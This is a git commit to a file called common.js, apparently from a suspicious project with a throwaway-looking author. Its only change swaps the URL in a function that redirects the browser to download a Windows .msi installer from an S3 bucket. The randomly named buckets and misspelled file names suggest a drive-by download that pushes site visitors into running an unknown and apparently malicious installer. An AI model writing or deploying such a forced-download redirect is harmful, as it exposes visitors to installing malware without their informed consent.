93275a3d28dbb7a6945ac34d43b9ec3ad2474414
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-07-28 11:00:22 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hoolew.s3.ap-southeast-2.amazonaws.com/haiiowold.msi";
+		var url="https://eythw.s3.ap-southeast-2.amazonaws.com/hellowrld.msi";
 		window.location=url;
 	}
 }
